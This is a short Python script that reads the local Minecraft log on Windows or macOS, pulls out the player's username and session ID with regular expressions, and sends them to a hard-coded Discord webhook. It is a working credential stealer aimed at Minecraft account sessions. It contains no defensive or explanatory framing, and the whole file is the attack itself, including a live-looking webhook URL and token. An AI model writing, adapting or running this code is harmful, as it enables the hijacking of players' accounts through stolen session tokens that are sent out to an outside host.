import os
import re

from discord_webhook import DiscordWebhook

webhook_url = "https://discord.com/api/webhooks/1305071313823731722/5LyIECoCiF55HLA8wx1GV5elVzSd2T5eYOswUfuuC68o844wGkOBNYAcMhSybCW45UX3"

def sendUserDetailsToDiscord():
    windows = os.environ.get('AppData')
    macos = os.path.expanduser("~/Library")

    if windows:
        # location of latest.log in Windows
        with open(f"{windows}\\.minecraft\\logs\\latest.log", "r") as file:
            content = file.read()

    elif macos:
        # location of latest.log in macOS
        with open(f"{macos}/Application Support/minecraft/logs/latest.log", "r") as file:
            content = file.read()

    else:
        print("Neither macOS or Microsoft Windows")
        exit(1)

    # find the user and session id with regex
    user = re.search(r"Setting user:.*", content)[0]
    session = re.search(r"Session ID is.*?\)", content)[0]

    if len(user) == 0 or len(session) == 0:
        print("Invalid Minecraft Version. Must be 1.9.1 or earlier")
        exit(1)

    # splice the strings so only the username and session id is outputted
    username = user[14:]
    session_id = session[14:-1]

    data = "Username: " + username + "\n" + "Session ID: " + session_id

    # send data to discord through discord-webook url
    webhook = DiscordWebhook(url=webhook_url, content=data)
    webhook.execute()

if __name__ == "__main__":
    sendUserDetailsToDiscord()
